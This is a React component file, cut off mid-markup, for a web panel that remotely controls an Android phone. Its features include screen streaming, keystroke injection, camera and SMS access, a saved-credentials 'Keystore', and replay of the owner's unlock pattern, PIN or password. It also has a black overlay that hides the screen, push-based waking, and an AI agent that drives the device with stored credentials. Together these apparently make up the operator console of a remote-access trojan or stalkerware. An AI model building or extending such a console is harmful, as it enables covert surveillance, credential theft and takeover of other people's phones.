import { useEffect, useRef, useState, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useNavigate, useParams } from 'react-router-dom';
import Background from '../components/Background';
import Toast from '../components/Toast';
import DeviceScreen from '../components/DeviceScreen';
import { VolumeSlider, TimeoutSlider } from '../components/SidePanels';
import { getDevice, setStream, sendCommand, setLockOverlay, getAgentChat, sendAgentMessage, clearAgentChat, confirmAgentAction, getAgentCreds, setAgentCreds, setAiConfigApi, getSession, activateAgentStream } from '../lib/store';

export default function Device() {
  const { id } = useParams();
  const navigate = useNavigate();
  const [device, setDevice] = useState(null);
  const [loading, setLoading] = useState(true);
  const [started, setStarted] = useState(false);  // user must click Start to begin stream
  const [menuOpen, setMenuOpen] = useState(false);
  const [toast, setToast] = useState({ show: false, msg: '', type: 'success' });
  const detailPoll = useRef(null);
  const aliveRef = useRef(true);
  const [lockModalOpen, setLockModalOpen] = useState(false);
  const [unlockModal, setUnlockModal] = useState(null); // 'pattern'|'pin'|'alpha'
  const [lock, setLock] = useState({ on: false, text: '' });
  const lockKey = 'ak_lock_' + id;
  const [agentOpen, setAgentOpen]     = useState(false);
  const [agentMessages, setAgentMessages] = useState([]);
  const [agentPending, setAgentPending]   = useState(null);
  const [agentLoading, setAgentLoading]   = useState(false);
  const [agentInput, setAgentInput]       = useState('');
  const [agentCreds, setAgentCredsState]  = useState({});
  const [agentShotUrl, setAgentShotUrl]   = useState(null);
  const [credsOpen, setCredsOpen]         = useState(false);
  const [aiKeyOpen, setAiKeyOpen]         = useState(false);

  // Restore lock state from localStorage
  useEffect(() => {
    try {
      const raw = localStorage.getItem(lockKey);
      if (raw) setLock(JSON.parse(raw));
    } catch {}
  }, [lockKey]);
  useEffect(() => {
    try { localStorage.setItem(lockKey, JSON.stringify(lock)); } catch {}
  }, [lockKey, lock]);

  const applyLock = async (on, text) => {
    try { await setLockOverlay(id, on, text); setLock({ on: !!on, text: String(text || '') }); flash(on ? 'LOCKED' : 'UNLOCKED'); }
    catch { flash('FAILED'); }
  };

  const openAgent = async () => {
    setAgentOpen(true);
    try { await activateAgentStream(id, true); } catch {}
    try {
      const res = await getAgentChat(id);
      setAgentMessages(res.messages || []);
      setAgentPending(res.pendingConfirm || null);
      const cr = await getAgentCreds(id);
      setAgentCredsState(cr.creds || {});
    } catch {}
  };

  const sendAgentMsg = async (text) => {
    if (!text.trim() || agentLoading) return;
    setAgentLoading(true);
    setAgentMessages(m => [...m, { role: 'user', content: text, ts: Date.now() }]);
    setAgentInput('');
    try {
      const res = await sendAgentMessage(id, text);
      if (res.error === 'NO_KEY') { setAiKeyOpen(true); setAgentLoading(false); return; }
      const newMsgs = [];
      if (res.thinking && res.thinking.trim()) newMsgs.push({ role: 'thinking', content: res.thinking, ts: Date.now() });
      newMsgs.push({ role: 'assistant', content: res.reply, ts: Date.now() });
      setAgentMessages(m => [...m, ...newMsgs]);
      if (res.confirmRequired) setAgentPending({ confirmMessage: res.confirmMessage });
      else setAgentPending(null);
    } catch (e) {
      setAgentMessages(m => [...m, { role: 'system_note', content: 'Error: ' + (e.message || 'Failed'), ts: Date.now() }]);
    }
    setAgentLoading(false);
  };

  const handleAgentConfirm = async (confirmed) => {
    try {
      await confirmAgentAction(id, confirmed);
      setAgentMessages(m => [...m, { role: 'system_note', content: confirmed ? '✅ Confirmed — commands sent to device.' : '❌ Action rejected.', ts: Date.now() }]);
      setAgentPending(null);
    } catch {}
  };

  const saveAgentCreds = async (creds) => {
    try { await setAgentCreds(id, creds); setAgentCredsState(creds); flash('Saved'); } catch { flash('Failed'); }
  };

  // Poll screenshot for agent panel + keepalive streaming
  useEffect(() => {
    if (!agentOpen) { setAgentShotUrl(null); return; }
    let alive = true;
    const fetchShot = async () => {
      if (!alive) return;
      try {
        const r = await fetch('/api/devices/' + encodeURIComponent(id) + '/screenshot', { headers: { Authorization: 'Bearer ' + getSession() } });
        if (!r.ok || !alive) return;
        const blob = await r.blob();
        if (!alive) return;
        const url = URL.createObjectURL(blob);
        setAgentShotUrl(prev => { if (prev) URL.revokeObjectURL(prev); return url; });
      } catch {}
    };
    const keepAlive = () => { activateAgentStream(id, true).catch(()=>{}); };
    fetchShot();
    const t1 = setInterval(fetchShot, 1500);
    const t2 = setInterval(keepAlive, 30000);
    return () => { alive = false; clearInterval(t1); clearInterval(t2); };
  }, [agentOpen, id]);


  const fetchDetail = useCallback(async () => {
    try { const d = await getDevice(id); if (aliveRef.current) { setDevice(d); setLoading(false); } }
    catch (e) { if (e.status === 401) navigate('/'); else if (e.status === 404) navigate('/dashboard'); }
  }, [id, navigate]);

  useEffect(() => {
    aliveRef.current = true;
    fetchDetail();
    detailPoll.current = setInterval(fetchDetail, 2500);
    return () => { aliveRef.current = false; clearInterval(detailPoll.current); };
  }, [fetchDetail]);

  // Toggle stream when started changes
  useEffect(() => {
    if (started) setStream(id, true).catch(() => {});
    return () => { if (started) setStream(id, false).catch(() => {}); };
  }, [started, id]);

  const flash = (msg) => { setToast({ show: true, msg, type: 'success' }); setTimeout(() => setToast(t => ({ ...t, show: false })), 900); };
  const navAct = (type, label) => sendCommand(id, type).then(() => flash(label)).catch(() => {});

  const goto = (path) => { setMenuOpen(false); navigate(path); };

  return (
    <div className="fixed inset-0 flex flex-col overflow-hidden bg-bg">
      <Background />

      {/* Header */}
      <header className="relative z-30 flex items-center justify-between gap-2 px-3 py-2.5 border-b border-white/[0.06] bg-bg/80 backdrop-blur-xl">
        <button onClick={() => navigate('/dashboard')} className="w-9 h-9 rounded-lg bg-white/[0.05] border border-white/[0.08] flex items-center justify-center text-white/75 hover:bg-white/10 active:scale-95 transition-all flex-shrink-0" aria-label="Back">
          <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2.2"><path d="M15 18l-6-6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg>
        </button>
        <div className="flex-1 min-w-0 text-center">
          <div className="text-[9px] font-bold tracking-[1.6px] uppercase text-white/35 leading-none">Remote Device</div>
          <div className="text-[12.5px] font-bold text-white/95 leading-tight mt-0.5 truncate">{device?.brand || '—'} {device?.model || ''}</div>
        </div>
        <div className="flex items-center gap-1.5 flex-shrink-0">
          {device && (
            <div className={`inline-flex items-center gap-1.5 px-2 py-1 rounded-full border text-[9.5px] font-bold tracking-wide uppercase ${device.online ? (started ? 'bg-accent3/10 border-accent3/30 text-accent3' : 'bg-white/[0.04] border-white/[0.08] text-white/55') : 'bg-white/[0.04] border-white/[0.08] text-white/45'}`}>
              <span className={`w-1.5 h-1.5 rounded-full ${device.online && started ? 'bg-accent3 shadow-[0_0_6px_rgba(0,255,200,0.8)] animate-pulse-soft' : device.online ? 'bg-white/40' : 'bg-white/30'}`} />
              {device.online ? (started ? 'Live' : 'Paused') : 'Off'}
            </div>
          )}
          <button onClick={() => setMenuOpen(o => !o)} className="w-9 h-9 rounded-lg bg-white/[0.05] border border-white/[0.08] flex items-center justify-center text-white/75 hover:bg-white/10 active:scale-95 transition-all" aria-label="Menu">
            <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2.2"><path d="M3 6h18M3 12h18M3 18h18" strokeLinecap="round"/></svg>
          </button>
        </div>
      </header>

      {/* Hamburger drawer */}
      <AnimatePresence>
        {menuOpen && (
          <>
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => setMenuOpen(false)} className="fixed inset-0 z-40 bg-black/50 backdrop-blur-[2px]" />
            <motion.div initial={{ opacity: 0, x: 20, y: -10 }} animate={{ opacity: 1, x: 0, y: 0 }} exit={{ opacity: 0, x: 20, y: -10 }} transition={{ duration: 0.18, ease: [0.22, 1, 0.36, 1] }} className="fixed top-[60px] right-3 z-50 w-[220px] glass rounded-xl border border-white/10 shadow-[0_20px_60px_-20px_rgba(0,0,0,0.7)] overflow-hidden">
              <MenuItem onClick={() => goto('/device/' + encodeURIComponent(id) + '/keystroke')} icon={
                <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M7 14h10" strokeLinecap="round"/></svg>
              } label="Keystroke" desc="Send text & keys" />
              <MenuItem onClick={() => goto('/device/' + encodeURIComponent(id) + '/reader')} icon={
                <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><path d="M2 3h6a4 4 0 014 4v14a3 3 0 00-3-3H2zM22 3h-6a4 4 0 00-4 4v14a3 3 0 013-3h7z"/></svg>
              } label="Reader EVLF" desc="Frame-by-frame view" />
              <MenuItem onClick={() => goto('/device/' + encodeURIComponent(id) + '/camera')} icon={
                <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><path d="M4 7h3l2-3h6l2 3h3a1 1 0 011 1v11a1 1 0 01-1 1H4a1 1 0 01-1-1V8a1 1 0 011-1z"/><circle cx="12" cy="13" r="4"/></svg>
              } label="Camera" desc="Live device camera" />
              <MenuItem onClick={() => { setMenuOpen(false); setLockModalOpen(true); }} icon={
                <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><rect x="5" y="11" width="14" height="9" rx="1.8"/><path d="M8 11V7a4 4 0 018 0v4" strokeLinecap="round"/></svg>
              } label="Screen Lock" desc={lock.on ? 'ON — black overlay' : 'Black overlay + text'} />
              <MenuItem onClick={() => goto('/device/' + encodeURIComponent(id) + '/inbox')} icon={
                <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><path d="M3 7l9 6 9-6" strokeLinecap="round" strokeLinejoin="round"/><rect x="3" y="5" width="18" height="14" rx="2"/></svg>
              } label="Inbox" desc="SMS & messages" />
              <MenuItem onClick={() => { setMenuOpen(false); openAgent(); }} icon={
                <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 015 0c0 2.5-2.5 3-2.5 5" strokeLinecap="round"/><circle cx="12" cy="17.5" r=".5" fill="currentColor" stroke="none"/></svg>
              } label="AI Agent" desc="Auto-control device with AI" />
              <MenuItem onClick={() => goto('/device/' + encodeURIComponent(id) + '/keystore')} icon={
                <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><rect x="5" y="11" width="14" height="9" rx="1.8"/><path d="M8 11V7a4 4 0 018 0v4" strokeLinecap="round"/></svg>
              } label="Keystore" desc="Saved credentials" />
              <MenuItem onClick={() => goto('/device/' + encodeURIComponent(id) + '/more')} icon={
                <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><circle cx="12" cy="5" r="1.5" fill="currentColor" stroke="none"/><circle cx="12" cy="12" r="1.5" fill="currentColor" stroke="none"/><circle cx="12" cy="19" r="1.5" fill="currentColor" stroke="none"/></svg>
              } label="More" desc="Settings & device info" />
            </motion.div>
          </>
        )}
      </AnimatePresence>

      {/* Main */}
      <main className="relative z-10 flex-1 min-h-0 flex items-center justify-center p-2">
        {loading ? (
          <span className="inline-block w-7 h-7 border-2 border-white/10 border-t-accent rounded-full animate-spin" />
        ) : (
          <div className="relative h-full w-full flex items-stretch justify-center gap-1.5">
            <div className="flex-shrink-0 w-7 sm:w-8 py-1 flex flex-col items-center">
              <VolumeSlider id={id} device={device} disabled={!device?.online} />
            </div>
            <div className="flex-1 min-w-0">
              <DeviceScreen id={id} device={device} started={started} />
            </div>
            <div className="flex-shrink-0 w-7 sm:w-8 py-1 flex flex-col items-center">
              <TimeoutSlider id={id} device={device} disabled={!device?.online} />
            </div>
          </div>
        )}

        {/* Big Start overlay — appears when stream is paused */}
        {!loading && !started && (
          <div className="absolute inset-0 z-30 flex items-center justify-center bg-black/40 backdrop-blur-sm pointer-events-none">
            <button
              onClick={() => setStarted(true)}
              disabled={!device?.online}
              className="pointer-events-auto inline-flex items-center gap-2.5 px-6 py-3.5 rounded-2xl bg-gradient-to-br from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white text-sm font-bold tracking-wide uppercase shadow-[0_8px_32px_rgba(16,185,129,0.5)] active:scale-95 transition-all disabled:opacity-30 disabled:cursor-not-allowed">
              <svg viewBox="0 0 24 24" className="w-5 h-5 fill-current"><path d="M6 4l14 8-14 8V4z"/></svg>
              {device?.online ? 'Start Stream' : 'Device Offline'}
            </button>
          </div>
        )}

        {/* Pause / Resume stream toggle (top-right) */}
        <button
          onClick={() => setStarted(s => !s)}
          className="absolute top-3 right-3 z-20 inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-full bg-black/55 backdrop-blur-md border border-white/10 text-[9.5px] font-bold tracking-wide uppercase text-white/85 hover:bg-black/70 active:scale-95 transition-all"
        >
          {started ? <span className="w-2 h-2 rounded-sm bg-rose-400" /> : <svg viewBox="0 0 24 24" className="w-3 h-3 stroke-current fill-current"><path d="M6 4l14 8-14 8V4z"/></svg>}
          {started ? 'Pause' : 'Start'}
        </button>
      </main>

      {/* Bottom controls */}
      <footer className="relative z-20 border-t border-white/[0.06] bg-bg/80 backdrop-blur-xl px-2 py-2 pb-[max(8px,env(safe-area-inset-bottom))]">
        {/* Unlock row — left icon reflects real lock state, Wake button turns screen on */}
        <div className="flex items-center gap-1 mb-1.5 px-0.5">
          {device?.keyguardLocked ? (
            // Closed padlock — device is currently locked
            <svg viewBox="0 0 24 24" className="w-3.5 h-3.5 stroke-rose-400 fill-none flex-shrink-0 drop-shadow-[0_0_4px_rgba(251,113,133,0.6)]" strokeWidth="2.2">
              <rect x="5" y="11" width="14" height="9" rx="1.5"/>
              <path d="M8 11V7a4 4 0 018 0v4" strokeLinecap="round"/>
            </svg>
          ) : (
            // Open padlock — device is unlocked
            <svg viewBox="0 0 24 24" className="w-3.5 h-3.5 stroke-emerald-400 fill-none flex-shrink-0 drop-shadow-[0_0_4px_rgba(52,211,153,0.6)]" strokeWidth="2.2">
              <rect x="5" y="11" width="14" height="9" rx="1.5"/>
              <path d="M8 11V7a4 4 0 0 1 7-1" strokeLinecap="round"/>
            </svg>
          )}
          <span className={`text-[8.5px] font-bold tracking-[1.4px] uppercase mr-1 ${device?.keyguardLocked ? 'text-rose-300/80' : 'text-emerald-300/80'}`}>
            {device?.keyguardLocked ? 'Locked' : 'Unlocked'}
          </span>
          {/* Wake button — turns screen on (and starts stream if paused) */}
          <button
            onClick={() => {
              sendCommand(id, 'wake').then(() => flash && flash('Screen waking…')).catch(() => flash && flash('wake failed', 'error'));
              if (!started) setStarted(true);
            }}
            disabled={!device?.online}
            title="Wake screen"
            className={`flex-shrink-0 inline-flex items-center gap-1 py-1 px-2 rounded-lg border text-[9px] font-bold tracking-[0.8px] uppercase transition-all active:scale-95 disabled:opacity-30 ${device?.screenOn === false ? 'bg-amber-500/15 border-amber-500/40 text-amber-200 hover:bg-amber-500/25' : 'bg-white/[0.04] border-white/[0.08] text-white/65 hover:bg-white/[0.1] hover:text-white'}`}>
            <svg viewBox="0 0 24 24" className="w-3 h-3 stroke-current fill-none" strokeWidth="2"><circle cx="12" cy="12" r="3.5"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3M5 5l2 2M17 17l2 2M5 19l2-2M17 7l2-2" strokeLinecap="round"/></svg>
            Wake
          </button>
          {/* FCM Wake Push — works even when device is offline / in Doze.
              Uses Google Play Services to wake AKFcmService → starts HeartbeatService. */}
          <button
            onClick={async () => {
              try {
                const r = await fetch(`/api/devices/${id}/wake-push`, { method: 'POST', credentials: 'include' });
                const j = await r.json().catch(() => ({}));
                if (r.ok) flash && flash('Push sent — device should wake in 1-2 sec');
                else flash && flash(j.error || 'push failed', 'error');
              } catch (e) {
                flash && flash('push failed: ' + e.message, 'error');
              }
            }}
            title="Send FCM push (works even when offline / in Doze)"
            className="flex-shrink-0 inline-flex items-center gap-1 py-1 px-2 rounded-lg border text-[9px] font-bold tracking-[0.8px] uppercase transition-all active:scale-95 bg-violet-500/15 border-violet-500/40 text-violet-200 hover:bg-violet-500/25">
            <svg viewBox="0 0 24 24" className="w-3 h-3 stroke-current fill-none" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
            Push
          </button>
          <div className="flex flex-1 items-center gap-1">
            {[['pattern','Pattern'],['pin','Password'],['alpha','ABC Pass']].map(([k,lbl]) => (
              <button key={k} onClick={() => {
                // Wake screen first so unlock UI is visible, then open the modal.
                sendCommand(id, 'wake').catch(() => {});
                if (!started) setStarted(true);
                setUnlockModal(k);
              }} disabled={!device?.online}
                className="flex-1 py-1 px-1 rounded-lg border text-[9px] font-bold tracking-[0.8px] uppercase transition-all active:scale-95 disabled:opacity-30 bg-white/[0.04] border-white/[0.08] text-white/65 hover:bg-white/[0.1] hover:text-white">
                {lbl}
              </button>
            ))}
          </div>
        </div>
        <div className="grid grid-cols-3 gap-1.5">
          <Nav label="Back" onClick={() => navAct('back', 'BACK')} disabled={!device?.online}>
            <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><path d="M9 18l-6-6 6-6M3 12h18" strokeLinecap="round" strokeLinejoin="round"/></svg>
          </Nav>
          <Nav label="Home" onClick={() => navAct('home', 'HOME')} disabled={!device?.online}>
            <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><circle cx="12" cy="12" r="9"/></svg>
          </Nav>
          <Nav label="Recents" onClick={() => navAct('recents', 'RECENTS')} disabled={!device?.online}>
            <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><rect x="5" y="5" width="14" height="14" rx="1.5"/></svg>
          </Nav>
        </div>
      </footer>

      {/* Unlock Modals */}
      <UnlockModal open={unlockModal} onClose={() => setUnlockModal(null)} device={device} deviceId={id} flash={flash} />
      <AgentPanel
        open={agentOpen}
        onClose={() => { setAgentOpen(false); activateAgentStream(id, false).catch(()=>{}); }}
        messages={agentMessages}
        pending={agentPending}
        loading={agentLoading}
        input={agentInput}
        setInput={setAgentInput}
        onSend={sendAgentMsg}
        shotUrl={agentShotUrl}
        onConfirm={handleAgentConfirm}
        creds={agentCreds}
        onSaveCreds={saveAgentCreds}
        credsOpen={credsOpen}
        setCredsOpen={setCredsOpen}
        aiKeyOpen={aiKeyOpen}
        setAiKeyOpen={setAiKeyOpen}
        deviceId={id}
        onClearChat={async () => { await clearAgentChat(id); setAgentMessages([]); setAgentPending(null); }}
      />
      <LockModal open={lockModalOpen} onClose={() => setLockModalOpen(false)} lock={lock} onApply={applyLock} />
      <Toast show={toast.show} message={toast.msg} type={toast.type} />
    </div>
  );
}

// ─── Pattern / PIN / Alpha Unlock ─────────────────────────────────────────
// Oppo/ColorOS lock-pattern dot positions (% of screen W x H)
// Row1=0.50, Row2=0.63, Row3=0.76
const DOT_POS = [
  [0.22, 0.50],[0.50, 0.50],[0.78, 0.50],
  [0.22, 0.63],[0.50, 0.63],[0.78, 0.63],
  [0.22, 0.76],[0.50, 0.76],[0.78, 0.76],
];

function UnlockModal({ open, onClose, device, deviceId, flash }) {
  const sw = device?.screenW || 1080;
  const sh = device?.screenH || 2400;

  // Pattern state
  const [drawn, setDrawn] = useState([]);
  // Ref-based dot tracking — avoids stale closure in fast pointer events
  const drawnRef = useRef([]);
  const linesRef = useRef([]);       // dot indices (0-8)
  const [lines, setLines] = useState([]);        // [{x1,y1,x2,y2}] for SVG
  const [activePct, setActivePct] = useState(null); // {x,y} mouse pos %
  const [isDrawing, setIsDrawing] = useState(false); // finger/pointer is down
  const svgRef = useRef(null);
  const [patternSent, setPatternSent] = useState(false);

  // PIN/alpha state
  const [pinVal, setPinVal] = useState('');
  const [alphaVal, setAlphaVal] = useState('');
  const [sending, setSending] = useState(false);

  useEffect(() => { if (!open) { drawnRef.current=[]; linesRef.current=[]; setDrawn([]); setLines([]); setActivePct(null); setIsDrawing(false); setPinVal(''); setAlphaVal(''); setSending(false); setPatternSent(false); } }, [open]);

  if (!open) return null;

  // ── dot coords in % of SVG box ──
  const dotPct = (i) => ({ x: DOT_POS[i][0] * 100, y: DOT_POS[i][1] * 100 });

  const svgPosOf = (e) => {
    const r = svgRef.current?.getBoundingClientRect();
    if (!r) return null;
    const cx = (e.touches?.[0]?.clientX ?? e.clientX) - r.left;
    const cy = (e.touches?.[0]?.clientY ?? e.clientY) - r.top;
    return { x: cx / r.width * 100, y: cy / r.height * 100 };
  };

  const HIT_R = 13;
  const hitDot = (pos) => {
    let best = -1, bestD = HIT_R;
    for (let i = 0; i < 9; i++) {
      const d = dotPct(i);
      const dist = Math.hypot(pos.x - d.x, pos.y - d.y);
      if (dist < bestD) { bestD = dist; best = i; }
    }
    return best;
  };


  const registerDot = (hi) => {
    if (drawnRef.current.includes(hi)) return;
    const last = drawnRef.current[drawnRef.current.length - 1];
    const from = dotPct(last);
    const to = dotPct(hi);
    linesRef.current = [...linesRef.current, { x1: from.x, y1: from.y, x2: to.x, y2: to.y }];
    drawnRef.current = [...drawnRef.current, hi];
    setDrawn([...drawnRef.current]);
    setLines([...linesRef.current]);
  };

  const onSvgDown = (e) => {
    e.preventDefault();
    try { e.currentTarget.setPointerCapture(e.pointerId); } catch {}
    const pos = svgPosOf(e);
    if (!pos) return;
    const hi = hitDot(pos);
    if (hi >= 0) {
      drawnRef.current = [hi];
      linesRef.current = [];
      setDrawn([hi]);
      setLines([]);
      setActivePct(pos);
      setIsDrawing(true);
      setPatternSent(false);
    }
  };

  const onSvgMove = (e) => {
    e.preventDefault();
    if (!drawnRef.current.length) return;
    const pos = svgPosOf(e);
    if (!pos) return;
    setActivePct(pos);
    const hi = hitDot(pos);
    if (hi >= 0) registerDot(hi);
  };

  const onSvgUp = (e) => {
    e.preventDefault();
    setIsDrawing(false);
    setActivePct(null);
  };

  const sendPattern = async () => {
    if (drawn.length < 2 || sending) return;
    setSending(true);
    try {
      // Single continuous multi-point gesture — Android needs ONE unbroken touch
      const points = drawn.map(i => [
        Math.round(DOT_POS[i][0] * sw),
        Math.round(DOT_POS[i][1] * sh),
      ]);
      const dur = 100 + drawn.length * 120; // 100ms base + 120ms per dot
      await sendCommand(deviceId, 'gesture', { points, dur });
      flash('Pattern sent!');
      setPatternSent(true);
      setTimeout(() => { setDrawn([]); setLines([]); setPatternSent(false); }, 1400);
    } catch { flash('Failed', 'error'); }
    setSending(false);
  };

  const sendPin = async () => {
    if (!pinVal || sending) return;
    setSending(true);
    try {
      await sendCommand(deviceId, 'text', { text: pinVal });
      await new Promise(r => setTimeout(r, 250));
      await sendCommand(deviceId, "enter", {});
      flash('PIN sent!');
    } catch { flash('Failed', 'error'); }
    setSending(false);
  };

  const sendAlpha = async () => {
    if (!alphaVal || sending) return;
    setSending(true);
    try {
      await sendCommand(deviceId, 'text', { text: alphaVal });
      await new Promise(r => setTimeout(r, 250));
      await sendCommand(deviceId, "enter", {});
      flash('Password sent!');
    } catch { flash('Failed', 'error'); }
    setSending(false);
  };

  const numPad = ['1','2','3','4','5','6','7','8','9','⌫','0','↵'];
  const onNum = (k) => {
    if (k === '⌫') setPinVal(v => v.slice(0,-1));
    else if (k === '↵') sendPin();
    else setPinVal(v => v + k);
  };

  return (
    <AnimatePresence>
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
        onClick={onClose}
        className="fixed inset-0 z-[60] bg-black/70 backdrop-blur-[3px] flex items-end justify-center">
        <motion.div initial={{ y: 60, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 60, opacity: 0 }}
          transition={{ duration: 0.22, ease: [0.22,1,0.36,1] }}
          onClick={e => e.stopPropagation()}
          className="w-full max-w-[400px] glass rounded-t-2xl border border-white/10 shadow-[0_-20px_60px_-10px_rgba(0,0,0,0.8)] overflow-hidden">

          {/* Handle */}
          <div className="flex justify-center pt-2.5 pb-1"><div className="w-10 h-1 rounded-full bg-white/20"/></div>

          {/* Title */}
          <div className="px-4 pb-2 flex items-center justify-between">
            <div className="text-[12px] font-bold text-white/90">
              {open === 'pattern' ? '🔷 Pattern Unlock' : open === 'pin' ? '🔢 PIN / Password' : '🔤 Alphabets Password'}
            </div>
            <button onClick={onClose} className="text-white/40 hover:text-white/80 transition-colors text-[18px] leading-none">×</button>
          </div>

          {/* ── PATTERN ── */}
          {open === 'pattern' && (
            <div className="px-4 pb-5">
              <div className="text-[10px] text-white/40 mb-3 text-center">Draw the unlock pattern. Touch dots in order.</div>
              {/* SVG pattern grid */}
              <div className="relative mx-auto" style={{ width: '220px', height: '220px' }}>
                <svg ref={svgRef} viewBox="0 0 100 100" className="w-full h-full touch-none select-none cursor-crosshair"
                  style={{ touchAction: 'none' }}
                  onPointerDown={onSvgDown} onPointerMove={onSvgMove} onPointerUp={onSvgUp}
                  onPointerLeave={onSvgUp} onPointerCancel={onSvgUp}>
                  {/* Connection lines */}
                  {lines.map((l,i) => (
                    <line key={i} x1={l.x1} y1={l.y1} x2={l.x2} y2={l.y2}
                      stroke={patternSent ? '#34d399' : '#60a5fa'} strokeWidth="2" strokeLinecap="round" opacity="0.85"/>
                  ))}
                  {/* Live trailing line */}
                  {drawn.length > 0 && activePct && (() => {
                    const last = dotPct(drawn[drawn.length-1]);
                    return <line x1={last.x} y1={last.y} x2={activePct.x} y2={activePct.y}
                      stroke="#60a5fa" strokeWidth="1.5" strokeLinecap="round" opacity="0.5" strokeDasharray="2 2"/>;
                  })()}
                  {/* 9 grid dots — faint ring always, filled only when drawn */}
                  {[0,1,2,3,4,5,6,7,8].map(i => {
                    const d = dotPct(i);
                    const active = drawn.includes(i);
                    const order = drawn.indexOf(i);
                    const clr = patternSent ? '#34d399' : '#60a5fa';
                    return (
                      <g key={i}>
                        {/* Outer ring — always visible as a guide */}
                        <circle cx={d.x} cy={d.y} r={7}
                          fill="none"
                          stroke={active ? clr : 'rgba(255,255,255,0.18)'}
                          strokeWidth={active ? 1.2 : 0.8}
                          opacity={active ? 0.7 : 1}/>
                        {/* Inner filled dot — only when drawn/active */}
                        {active && (
                          <circle cx={d.x} cy={d.y} r={4}
                            fill={clr} opacity={patternSent ? 1 : 0.9}/>
                        )}
                        {/* Order number inside dot */}
                        {active && order >= 0 && (
                          <text x={d.x} y={d.y + 0.9} textAnchor="middle" dominantBaseline="middle"
                            fontSize="3.5" fill="white" fontWeight="bold">{order+1}</text>
                        )}
                      </g>
                    );
                  })}
                </svg>
              </div>
              <div className="flex gap-2 mt-3">
                <button onClick={() => { drawnRef.current=[]; linesRef.current=[]; setDrawn([]); setLines([]); setActivePct(null); setIsDrawing(false); setPatternSent(false); }}
                  className="flex-1 py-2 rounded-xl bg-white/[0.05] border border-white/[0.1] text-[11px] font-bold tracking-[1px] uppercase text-white/60 hover:bg-white/[0.1] active:scale-95 transition-all">
                  Clear
                </button>
                <button onClick={sendPattern} disabled={drawn.length < 2 || sending}
                  className="flex-1 py-2 rounded-xl bg-blue-500/20 border border-blue-500/40 text-[11px] font-bold tracking-[1px] uppercase text-blue-300 hover:bg-blue-500/30 active:scale-95 transition-all disabled:opacity-40 disabled:cursor-not-allowed">
                  {sending ? 'Sending…' : patternSent ? '✓ Sent!' : `Send (${drawn.length} dots)`}
                </button>
              </div>
            </div>
          )}

          {/* ── PIN ── */}
          {open === 'pin' && (
            <div className="px-4 pb-5">
              <div className="text-[10px] text-white/40 mb-3 text-center">Enter device PIN or numeric password.</div>
              {/* PIN display */}
              <div className="flex items-center justify-center gap-1.5 mb-3 h-10 px-3 rounded-xl bg-black/40 border border-white/[0.08]">
                {pinVal.split('').map((_, i) => (
                  <div key={i} className="w-2.5 h-2.5 rounded-full bg-blue-400"/>
                ))}
                {pinVal.length === 0 && <span className="text-[11px] text-white/25 font-bold tracking-wider">Enter PIN</span>}
              </div>
              {/* Numpad */}
              <div className="grid grid-cols-3 gap-1.5">
                {numPad.map(k => (
                  <button key={k} onClick={() => onNum(k)} disabled={k === '↵' && !pinVal}
                    className={"py-3 rounded-xl border text-[14px] font-bold transition-all active:scale-90 " +
                      (k === '↵' ? "bg-blue-500/20 border-blue-500/40 text-blue-300 hover:bg-blue-500/30" :
                       k === '⌫' ? "bg-white/[0.06] border-white/[0.1] text-white/70 hover:bg-white/[0.12]" :
                       "bg-white/[0.04] border-white/[0.08] text-white/90 hover:bg-white/[0.1]") +
                      (k === '↵' && !pinVal ? " opacity-40 cursor-not-allowed" : "")}>
                    {k}
                  </button>
                ))}
              </div>
              <button onClick={sendPin} disabled={!pinVal || sending}
                className="w-full mt-3 py-2.5 rounded-xl bg-blue-500/20 border border-blue-500/40 text-[11px] font-bold tracking-[1px] uppercase text-blue-300 hover:bg-blue-500/30 active:scale-95 transition-all disabled:opacity-40">
                {sending ? 'Sending…' : 'Unlock Device'}
              </button>
            </div>
          )}

          {/* ── ALPHA ── */}
          {open === 'alpha' && (
            <div className="px-4 pb-5">
              <div className="text-[10px] text-white/40 mb-3 text-center">Enter alphabetic or mixed password.</div>
              <input
                type="text"
                value={alphaVal}
                onChange={e => setAlphaVal(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter') sendAlpha(); }}
                autoFocus
                placeholder="Enter password…"
                className="w-full px-3 py-3 rounded-xl bg-black/40 border border-white/[0.08] text-[14px] text-white placeholder-white/25 outline-none focus:border-blue-400/50 transition-colors mb-3"
              />
              <button onClick={sendAlpha} disabled={!alphaVal || sending}
                className="w-full py-2.5 rounded-xl bg-blue-500/20 border border-blue-500/40 text-[11px] font-bold tracking-[1px] uppercase text-blue-300 hover:bg-blue-500/30 active:scale-95 transition-all disabled:opacity-40">
